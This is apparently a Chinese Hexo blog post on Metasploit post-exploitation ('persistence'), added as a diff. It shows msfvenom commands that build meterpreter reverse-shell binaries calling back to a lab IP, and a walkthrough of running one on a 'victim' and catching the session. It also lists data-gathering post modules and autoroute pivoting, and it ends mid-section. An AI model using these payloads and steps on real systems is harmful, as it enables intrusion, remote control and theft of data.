@@ -1,0 +1,1194 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="博客搭建,Tags创建," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="权限维持MetasploitMetasploit：简介​         全称为The Metasploit Framework，简称MSF。这是一个渗透测试的框架，但不是一个直接的渗透测试攻击软件。Metasploit作为全球最受欢迎的工具，不仅仅是因为它的方便性和强大性，更重要的是它的框架（MSF）。它允许使用者开发自己的漏洞脚本，从而进行测试。 ​        之所以称为框架，因为MSF本">
+<meta property="og:type" content="article">
+<meta property="og:title" content="权限维持">
+<meta property="og:url" content="http://yoursite.com/2020/02/07/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/index.html">
+<meta property="og:site_name" content="South&#39;D 的博客">
+<meta property="og:description" content="权限维持MetasploitMetasploit：简介​         全称为The Metasploit Framework，简称MSF。这是一个渗透测试的框架，但不是一个直接的渗透测试攻击软件。Metasploit作为全球最受欢迎的工具，不仅仅是因为它的方便性和强大性，更重要的是它的框架（MSF）。它允许使用者开发自己的漏洞脚本，从而进行测试。 ​        之所以称为框架，因为MSF本">
+<meta property="og:image" content="http://yoursite.com/2020/02/07/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1579107591226.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/07/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1579071537459.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/07/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1579109585950.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/07/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1579109020242.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/07/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1579071862558.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/07/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1579071967325.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/07/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1579072243988.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/07/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1579141395821.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/07/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1579077280833.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/07/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1579077604552.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/07/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1579074748411.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/07/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1579074806909.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/07/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1579075346698.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/07/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1579075692864.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/07/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1579137646588.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/07/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1579142246811.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/07/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1579142633251.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/07/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1579146584979.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/07/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1579154958672.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/07/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1579155455579.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/07/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1579155446168.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/07/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1581009924233.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/07/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1579158770684.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/07/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1579159207829.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/07/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1579161887545.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/07/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1579162024668.png">
+<meta property="og:image" content="https://img-blog.csdn.net/20170208145512754?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzQ4NDE4MjM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center">
+<meta property="og:image" content="https://img-blog.csdn.net/20170208151141658?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzQ4NDE4MjM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center">
+<meta property="og:image" content="https://img-blog.csdn.net/20170208151157433?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzQ4NDE4MjM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center">
+<meta property="article:published_time" content="2020-02-06T17:04:14.431Z">
+<meta property="article:modified_time" content="2020-02-06T17:30:00.523Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="博客搭建">
+<meta property="article:tag" content="Tags创建">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/02/07/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1579107591226.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/02/07/权限维持/"/>
+
+
+
+
+
+  <title>权限维持 | South'D 的博客</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">South'D 的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-resources">
+          <a href="/resources%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-download"></i> <br />
+            
+            resources
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/07/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/hearder.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="South'D 的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">权限维持</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-07T01:04:14+08:00">
+                2020-02-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%86%85%E7%BD%91/" itemprop="url" rel="index">
+                    <span itemprop="name">内网</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h1><h2 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h2><h3 id="Metasploit：简介"><a href="#Metasploit：简介" class="headerlink" title="Metasploit：简介"></a>Metasploit：简介</h3><p>​         全称为The Metasploit Framework，简称MSF。这是一个渗透测试的框架，但不是一个直接的渗透测试攻击软件。Metasploit作为全球最受欢迎的工具，不仅仅是因为它的方便性和强大性，更重要的是它的框架（MSF）。它允许使用者开发自己的漏洞脚本，从而进行测试。</p>
+<p>​        之所以称为框架，因为MSF本身包含了很多漏洞攻击模块，由一群开发者在进行维护和更新，最重要的是几乎每个CVE漏洞都会被添加到MSF里，有人称之为是“可以黑掉整个宇宙”的渗透测试框架。</p>
+<p>​         这个强大的框架目前已发布最新的5.0版本。          </p>
+<h3 id="Metasploit的目录结构"><a href="#Metasploit的目录结构" class="headerlink" title="Metasploit的目录结构"></a>Metasploit的目录结构</h3><table>
+<thead>
+<tr>
+<th>msf的安装目录</th>
+<th>/usr/share/metasploit-framework（kali默认安装路径）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>重点目录：</td>
+<td></td>
+</tr>
+<tr>
+<td>modules</td>
+<td>Merasploit的核心目录，存放着各个攻击模块</td>
+</tr>
+<tr>
+<td>tools</td>
+<td>存放着大量的使用工具</td>
+</tr>
+<tr>
+<td>script</td>
+<td>下面存放的是各种脚本文件</td>
+</tr>
+<tr>
+<td>exploit</td>
+<td></td>
+</tr>
+</tbody></table>
+<p>kali默认安装路径</p>
+<p>/usr/share/metasploit-framework</p>
+<p><img src="/2020/02/07/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1579107591226.png" alt="1579107591226"></p>
+<p>Metasploit的目录结构</p>
+<p>modules目录</p>
+<table>
+<thead>
+<tr>
+<th>auxiliary</th>
+<th>主要包含辅助性脚本（扫描、嗅探、注入、爆破，漏洞挖掘）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>encoders</td>
+<td>主要包含各种编码工具，以便绕过入侵检测和过滤系统</td>
+</tr>
+<tr>
+<td>evasion</td>
+<td>免杀模块，绕过windows系统自带杀软</td>
+</tr>
+<tr>
+<td>exploits</td>
+<td>漏洞利用，包含主流的漏洞利用脚本，exp命名规则：系统/服务/模块</td>
+</tr>
+<tr>
+<td>nops</td>
+<td>绕过针对溢出攻击滑行字符串的拦截检测</td>
+</tr>
+<tr>
+<td>payloads</td>
+<td>攻击 荷载，主要在目标机器执行代码</td>
+</tr>
+<tr>
+<td>post</td>
+<td>此目录放着msf的exploit执行成功后，向目标发送的一些功能性指令，如提权，获取hash等</td>
+</tr>
+</tbody></table>
+<p>查看各个模块的信息</p>
+<p>show ＋模块名</p>
+<p>例：show exploits</p>
+<hr>
+<p>msfvenom -l payload</p>
+<p># 等同msfconsole下的</p>
+<p>show payloads</p>
+<p><img src="/2020/02/07/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1579071537459.png" alt="1579071537459"></p>
+<p>第一次使用msf</p>
+<p>初始化数据库</p>
+<p>（1）启动postgresql数据库：service postgresql start</p>
+<p><img src="/2020/02/07/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1579109585950.png" alt="1579109585950"></p>
+<p>（2）对msf进行数据库初始化：msfdb init</p>
+<p>如果没有启动msf数据库：（报以下问题）</p>
+<p><img src="/2020/02/07/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1579109020242.png" alt="1579109020242"></p>
+<p><img src="/2020/02/07/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1579071862558.png" alt="1579071862558"></p>
+<p>（3）输入msfconsole进入msf界面</p>
+<p>（4）在msf界面输入db_status查看msf与postgresql数据的连接状态</p>
+<hr>
+<h3 id="msf生成payload控制服务器"><a href="#msf生成payload控制服务器" class="headerlink" title="msf生成payload控制服务器"></a>msf生成payload控制服务器</h3><p>搜索攻击模块</p>
+<p>search ms17_010    #譬如搜索exp</p>
+<p>msfvenom(载荷生成器)的搜索方式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -l payload | grep &lt;keywords&gt;</span><br><span class="line">例如搜windows</span><br><span class="line">msfvenom -l payloads | grep windows |grep meterpreter</span><br></pre></td></tr></table></figure>
+
+<p>生成payload木马</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">linux</span><br><span class="line">msfvenom -p linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;&lt;remoteHost&gt; LPORT&#x3D;&lt;PORT&gt; -f elf -o shell.elf</span><br><span class="line"></span><br><span class="line">windows</span><br><span class="line">msfvenom -p windows&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.139.129 LPORT&#x3D;4446 -f exe -o shell.exe</span><br><span class="line"></span><br><span class="line">[其它类型的payload生成方式](https:&#x2F;&#x2F;www.cnblogs.com&#x2F;backlion&#x2F;p&#x2F;6000544.html)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/02/07/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1579071967325.png" alt="1579071967325"></p>
+<p><img src="/2020/02/07/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1579072243988.png" alt="1579072243988"></p>
+<p>演示:</p>
+<p>步骤一、</p>
+<p>kali:msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.139.129 lport=4444 -f elf -o shell</p>
+<p>生成payload ：路径是本目录下，ls直接可以看到</p>
+<p>利用xftp传到本机电脑再传到受害者上面</p>
+<p>步骤二、</p>
+<p>kali：msfconsole进入控制命令行</p>
+<p>use exploit/multi/handler</p>
+<p>set payload linux/x86/meterpreter/reverse_tcp </p>
+<p>options   (查看还需要什么要配置)</p>
+<p><img src="/2020/02/07/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1579141395821.png" alt="1579141395821"></p>
+<p>set lhost 192.168.139.129</p>
+<p>set lport 4444</p>
+<p> exploit -j -z</p>
+<p>步骤三、</p>
+<p>受害者：给shell读写权限 ：chmod a+x shell</p>
+<p>执行： ./shell</p>
+<p><img src="/2020/02/07/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1579077280833.png" alt="1579077280833"></p>
+<p>这样就可以获取到sessions</p>
+<p>拿shell</p>
+<p><img src="/2020/02/07/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1579077604552.png" alt="1579077604552"></p>
+<p>sessions 加数字进入 meterpreter</p>
+<p>meterpreter</p>
+<p><img src="/2020/02/07/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1579074748411.png" alt="1579074748411"></p>
+<hr>
+<h3 id="msf攻击模块"><a href="#msf攻击模块" class="headerlink" title="msf攻击模块"></a>msf攻击模块</h3><p><img src="/2020/02/07/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1579074806909.png" alt="1579074806909"></p>
+<p>search ms08_067</p>
+<p><img src="/2020/02/07/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1579075346698.png" alt="1579075346698"></p>
+<p><img src="/2020/02/07/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1579075692864.png" alt="1579075692864"></p>
+<h3 id="msf监听模块"><a href="#msf监听模块" class="headerlink" title="msf监听模块"></a>msf监听模块</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line"></span><br><span class="line">配置payload</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt;</span><br><span class="line"></span><br><span class="line">set payload linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp 设置payload</span><br><span class="line">options</span><br><span class="line">set lhost &lt;localhost&gt;</span><br><span class="line">set lport &lt;port&gt;</span><br></pre></td></tr></table></figure>
+
+<p>运行payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">run    #服务器上线，获得一个session，并返回得到metasploit交互终端</span><br><span class="line"></span><br><span class="line">exploit -j -z    #参数-z：不弹出交互  -j：在jobs里后台运行</span><br><span class="line"></span><br><span class="line">metasploit交互终端常用命令</span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br><span class="line"></span><br><span class="line">shell  #进入shell</span><br><span class="line">exit   #退出</span><br><span class="line">bg    #放到后台</span><br><span class="line">？   #help</span><br></pre></td></tr></table></figure>
+
+
+
+<p>msf监听模块常用命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sessions   #查看上线服务器</span><br><span class="line">sessions &lt;id&gt;    #进入session会话</span><br><span class="line">exit    #退出监听模块</span><br><span class="line">jobs    #查看后台监听</span><br><span class="line">kill &lt;jobid&gt;  #终结后台监听程序</span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
+<h2 id="meterpreter"><a href="#meterpreter" class="headerlink" title="meterpreter"></a>meterpreter</h2><p>​         Meterpreter是Metasploit框架中的一个扩展模块，作为攻击成功以后的攻击载荷使用。使用它作为攻击载荷能够获得目标系统的一个Meterpreter shell 的链接。Meterpreter shell作为渗透模块有很多有用的功能，比如添加一个用户、隐藏一些东西，打开shell、得到用户密码、上传下载远程主机的文件、运行cmd.exe、捕捉屏幕、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息、显示远程机器的网络接口和IP地址等信息。</p>
+<p>​        需要说明的是meterpreter在漏洞利用成功后会发送第二阶段的代码，所以在网络不稳定的情况下经常出现没有可执行命令，或者会话建立执行help之后发现缺少命令。连上vpn又在内网中使用psexec和bind_tcp的时候经常会出现这种情况。</p>
+<p><img src="/2020/02/07/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1579137646588.png" alt="1579137646588"></p>
+<p>meterpreter的命令：</p>
+<p>Core Commands</p>
+<p>File system Commands</p>
+<p>Networking Commands</p>
+<p>System Commands</p>
+<p>User interface Commands</p>
+<p>webcan commands</p>
+<p>audio output commands</p>
+<p>elevate commands</p>
+<p>password database commands</p>
+<p>timestomp commands</p>
+<p>Core Commands核心命令</p>
+<table>
+<thead>
+<tr>
+<th>backgroup</th>
+<th>把当前Meterpreter会话放到后台运行</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>exit</td>
+<td>直接中断当前Meterpreter会话</td>
+</tr>
+<tr>
+<td>migrate</td>
+<td>进程迁移</td>
+</tr>
+<tr>
+<td>run</td>
+<td>调用meterpreter scipt or post module</td>
+</tr>
+<tr>
+<td>load</td>
+<td>加载meterpreter扩展程序</td>
+</tr>
+</tbody></table>
+<p>run ：调用meterpreter自带脚本和post模块</p>
+<table>
+<thead>
+<tr>
+<th>是否虚拟机（window）</th>
+<th>run post/windows/gather/checkvm</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>是否虚拟机（linux）</td>
+<td>run post/linux/gather/checkvm</td>
+</tr>
+<tr>
+<td>查看分区</td>
+<td>run post/windows/gather/forensics/enum_driver</td>
+</tr>
+<tr>
+<td>获取安装软件信息</td>
+<td>run post/windows/gather/enum_applications</td>
+</tr>
+<tr>
+<td>获取最近的文件操作</td>
+<td>run post/windows/gather/dumplinks</td>
+</tr>
+<tr>
+<td>获取IE缓存</td>
+<td>run post/windows/gather/enum_ie</td>
+</tr>
+<tr>
+<td>获取Chrome缓存</td>
+<td>run post/windows/gather/enum_chrome</td>
+</tr>
+<tr>
+<td>补丁信息</td>
+<td>run post/windows/gather/enum_patches</td>
+</tr>
+<tr>
+<td>查找域控</td>
+<td>run post/windows/gather/enum_domain</td>
+</tr>
+</tbody></table>
+<p>run post/windows/gather/usb_history       查看usb 历史</p>
+<h2 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h2><h3 id="run命令"><a href="#run命令" class="headerlink" title="run命令"></a>run命令</h3><p><img src="/2020/02/07/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1579142246811.png" alt="1579142246811"></p>
+<p>core commands核心命令</p>
+<p>run            调用meterpreter自带脚本和Post模块</p>
+<p>Msf添加内网路由</p>
+<table>
+<thead>
+<tr>
+<th>run get_local_subnets</th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>run autoroute -s 192.168.10.0/24</td>
+<td></td>
+</tr>
+<tr>
+<td>run autoroute -p</td>
+<td></td>
+</tr>
+</tbody></table>
+<p><img src="/2020/02/07/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1579142633251.png" alt="1579142633251"></p>
+<p>msf端口扫描模块：</p>
